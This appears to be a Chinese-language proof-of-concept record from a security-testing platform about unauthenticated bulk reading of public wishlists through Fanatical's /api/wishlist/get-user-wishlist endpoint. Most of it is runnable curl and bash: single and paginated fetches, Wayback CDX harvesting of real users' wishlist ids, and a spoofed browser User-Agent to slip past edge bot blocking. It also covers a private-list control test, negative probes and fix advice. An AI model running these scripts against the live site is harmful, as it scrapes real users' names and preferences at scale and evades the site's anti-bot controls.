# Fanatical www.fanatical.com /api/wishlist/get-user-wishlist/{id} 免鉴权批量读取公开愿望单（76 个列表 / 10,375 项；私有列表服务端抑制 items）

- **code**: fanatical-wishlist-get-user-wishlist-unauth-public-read
- **kind**: poc
- **category**: unauthorized
- **component**: Fanatical 主站愿望单 API（www.fanatical.com/api/wishlist，Heroku/Express + Algolia）
- **severity**: low
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: finding_id=178（task#3，finding_checks.verdict=verified、findings.status=confirmed）。2026-11-11 本机 Linux，curl + Python requests，经 Cloudflare 公网 www.fanatical.com，全程无 Cookie/Authorization/anonid：① GET /api/wishlist/get-user-wishlist/647fa7701774abfaa51d7e74?sort=fan&page=1 → HTTP 200 / 82199B，{"wishlistDisplayName":"...","items":[...],"nbHits":160,"nbPages":5,"hitsPerPage":36,"isPrivate":false}；② Wayback CDX 提取 76 个唯一 24hex id，逐一匿名请求 76/76=200，75 个具名公开列表 nbHits 合计 10,375，最大 NickFirzen 1103 项，page=1..28 全量取回 1000 个完整商品文档；③ 私有对照 62d4643240e4e100967ad292 → 200/40B {"items":[],"err":null,"isPrivate":true}，服务端抑制 items，原“私有列表仅客户端隐藏”判断被证伪；④ 写面 save/addtowishlistfromslug 400、user/add-wishlist-friend 等 401；⑤ 9 个归档 order userId 查本接口全 500 {"err":"User not found"}；120 次 ObjectId 计数器枚举 0 命中。原始流量由平台记录代理抓取 traffic id 1794433859-5203（200/82199B）。
- **path**: pocs/fanatical-wishlist-get-user-wishlist-unauth-public-read/fanatical-wishlist-get-user-wishlist-unauth.md
- **tags**: fanatical,wishlist,unauthorized,idor,algolia,wayback,scraping,api
- **created_at**: 2026-11-11T22:06:08.937Z
- **engine**: https://www.fanatical.com

## 描述

Fanatical 愿望单读取接口 /api/wishlist/get-user-wishlist/{id} 对公开分享列表完全免鉴权：无需账号/Cookie/Authorization/anonid，仅凭 24 位 hex wishlist id 即可读取显示名与全部商品偏好并分页遍历。私有列表（isPrivate=true）由服务端抑制 items，不构成隐私绕过；也未通向礼卡/订单/会话/后台。

## 用法

```
【前置】匿名可达 https://www.fanatical.com/api；浏览器类 UA（裸 curl UA 会被边缘拦 403/400 "Request blocked"）；需要 24 位 hex 的 wishlist id（公开分享链接 /{locale}/wishlist/{id} 或 Wayback CDX 提取）。本接口实测仅需 UA + accept，不必带 anonid。
【单条】curl -s -A "$ARTEX_UA" -H 'accept: application/json' 'https://www.fanatical.com/api/wishlist/get-user-wishlist/<24hex>?sort=fan&page=1'
【判据】200 且 JSON 含 wishlistDisplayName/items/nbHits/hitsPerPage=36/isPrivate=false → 公开列表未授权读取成立；200 仅 40B {"items":[],"err":null,"isPrivate":true} → 私有列表被服务端抑制，不可读（勿误判为绕过）；500 {"err":"User not found"} → 传的是 order userId，与本 id 不同源。
【全量】按 page=1..nbPages 遍历（Algolia 单查询上限 1000 条，nbHits=1103 时 28 页最多回 1000 个 item 文档）。
【批量取材】Wayback CDX：url=www.fanatical.com/en/wishlist/&matchType=prefix&collapse=urlkey，grep -oE '[0-9a-f]{24}' 去重；de/fr 前缀同法拉取合并；逐 id 请求、间隔≥1s。
【阴性边界】写面 /api/wishlist/save、addtowishlistfromslug 400；/api/user/add-wishlist-friend、change-wishlist-visibility、get-wishlist-friends 401；以已知 id ±12 做 ObjectId 计数器枚举 120 次 0 命中，id 不可枚举。
```

## 正文

```
# Fanatical 免鉴权读取公开愿望单（/api/wishlist/get-user-wishlist/{id}）

## 前置条件
- 目标：https://www.fanatical.com 的 Express/Heroku 后端 API（Cloudflare Worker 前置）。
- 无需账号 / 会话 / Cookie / Authorization / anonid；本接口实测仅需浏览器 UA + `accept: application/json`。
- 必须使用浏览器类 User-Agent：裸 curl UA 会被边缘拦成 403/400 `Request blocked`。
- 需要一个 24 位 hex 的 wishlist id（wishlist 文档 _id）。来源：
  - 用户公开分享链接：`https://www.fanatical.com/{locale}/wishlist/{id}`（en/de/fr 等）；
  - Wayback CDX 批量提取历史分享链接中的 id。
- 注意：wishlist id 与 order userId 不同源，不能互相套用。

## 1) 单条读取（主判据）
```bash
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36}"
curl -s -A "$UA" -H 'accept: application/json' \
  'https://www.fanatical.com/api/wishlist/get-user-wishlist/647fa7701774abfaa51d7e74?sort=fan&page=1'
```
期望回显：HTTP 200，约 80KB JSON：
```json
{"wishlistDisplayName":"<display>","items":[{"product_id":"...","sku":"...","name":"...","price":...,"fullPrice":...,"discount_percent":...,"wishlistDate":"..."}],
 "nbHits":160,"nbPages":5,"hitsPerPage":36,"isPrivate":false}
```
命中 = 匿名拿到他人愿望单的显示名 + 完整商品偏好（分页可遍历全量）。

## 2) 分页取全量
```bash
ID=<24hex>
for p in $(seq 1 <nbPages>); do
  curl -s -A "$UA" -H 'accept: application/json' \
    "https://www.fanatical.com/api/wishlist/get-user-wishlist/$ID?sort=fan&page=$p" \
    -o "wl_${ID}_${p}.json"
  sleep 1
done
# 合并：
jq -s '[.[].items[]]' wl_${ID}_*.json > items.json
# Algolia 分页上限 1000：单表 nbHits=1103 时 page=1..28（36/页）最多只回 1000 个 item 文档。
```

## 3) 批量取材（Wayback 历史公开分享链接）
```bash
curl -s 'http://web.archive.org/cdx/search/cdx?url=www.fanatical.com/en/wishlist/&matchType=prefix&fl=original,timestamp,statuscode&collapse=urlkey&limit=3000' \
  | grep -oE '[0-9a-f]{24}' | sort -u > ids.txt
# de/fr 前缀各拉一次再合并去重。
while read -r id; do
  r=$(curl -s -A "$UA" -H 'accept: application/json' \
      "https://www.fanatical.com/api/wishlist/get-user-wishlist/$id?sort=fan&page=1")
  echo "$id $r" >> results.jsonl
  sleep 1
done < ids.txt
```

## 4) 私有列表对照（关键：这不是绕过）
```bash
curl -s -A "$UA" -H 'accept: application/json' \
  'https://www.fanatical.com/api/wishlist/get-user-wishlist/62d4643240e4e100967ad292?sort=fan&page=1'
# → HTTP 200 / 40B: {"items":[],"err":null,"isPrivate":true}
# 无 nbHits/nbPages：服务端对非好友匿名请求直接抑制 items。
# 结论：私有 wishlist 不可读，“isPrivate 仅前端隐藏、items 全量下发”的判断不成立。
```

## 响应判据表
| 回显 | 含义 |
|---|---|
| 200 + wishlistDisplayName + items + nbHits | 公开分享列表，未授权读取成立 |
| 200 + `{"items":[],"err":null,"isPrivate":true}`（仅 40B，无 nbHits/nbPages） | 私有列表，服务端抑制，不可读 |
| 500 `{"err":"User not found"}` | 传入的是 order userId 而非 wishlist id（不同源） |
| 400 `Could not parse id` | id 不是 24 位 hex |
| 400/403 `Request blocked` | UA 是爬虫类（或该路由需 anonid: UUIDv4） |
| 404/空 body | id 不存在或已删除 |

## 5) 写面与枚举（实测阴性，别重复投入）
- `POST /api/wishlist/save` → 400 `Could not parse id`
- `POST /api/wishlist/addtowishlistfromslug` → 400 `No user id`
- `PUT /api/user/add-wishlist-friend`、`PUT /api/user/change-wishlist-visibility`、`GET /api/user/get-wishlist-friends` → 401 `Missing authorization header`
- 9 个 Wayback 归档 order userId 拿来查本接口 → 全 500 `User not found`（不同源）
- 以 5 个已知 id 为中心 ±12 做 ObjectId 计数器枚举，共 120 次，0 命中 → id 不可枚举（24hex 空间）
- 未取得礼卡码、订单、支付数据、会话或后台入口；本接口不构成通往礼卡/后台的链路。

## 影响与修复
- 成立：任何人凭公开分享的 24hex id 可匿名、批量读取显示名（可含用户自设为显示名的邮箱）与完整商品偏好；实测 76/76 公开 id 可读，75 个具名列表 nbHits 合计 10,375，最大单表 1,103 项。
- 不成立：私有列表 items 服务端抑制，私密数据未泄露。
- 修复：分享 id 改为可撤销 token；对 get-user-wishlist 的批量/分页抓取限速与反爬；好友可见列表强制鉴权并在服务端校验好友关系。
```
